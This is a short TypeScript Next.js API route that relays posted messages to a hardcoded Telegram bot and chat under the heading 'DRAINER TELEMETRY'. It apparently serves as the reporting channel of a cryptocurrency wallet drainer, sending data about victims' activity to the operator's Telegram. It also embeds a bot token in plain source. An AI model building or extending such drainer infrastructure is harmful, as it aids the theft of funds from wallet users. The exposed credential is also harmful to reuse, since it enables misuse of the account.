// src/app/api/notify-telegram/route.ts
import { NextRequest, NextResponse } from "next/server";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8509074705:AAHXV0eNLlxVI5aJkecg_MaUo3TXZRqq2kI";
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "7018514397";

export async function POST(req: NextRequest) {
  try {
    const { message } = await req.json();

    if (!message || typeof message !== "string") {
      return NextResponse.json({ ok: false, error: "Missing message" }, { status: 400 });
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const tgRes = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `🚀 *DRAINER TELEMETRY*\n\n${message}`,
        parse_mode: "Markdown",
      }),
    });

    const tgJson = await tgRes.json();

    if (!tgRes.ok || !tgJson.ok) {
      console.error("Telegram API error:", tgJson);
      return NextResponse.json({ ok: false, error: "Telegram error" }, { status: 500 });
    }

    return NextResponse.json({ ok: true });
  } catch (e: any) {
    console.error("notify-telegram error:", e);
    return NextResponse.json({ ok: false, error: e.message || "Unknown error" }, { status: 500 });
  }
}
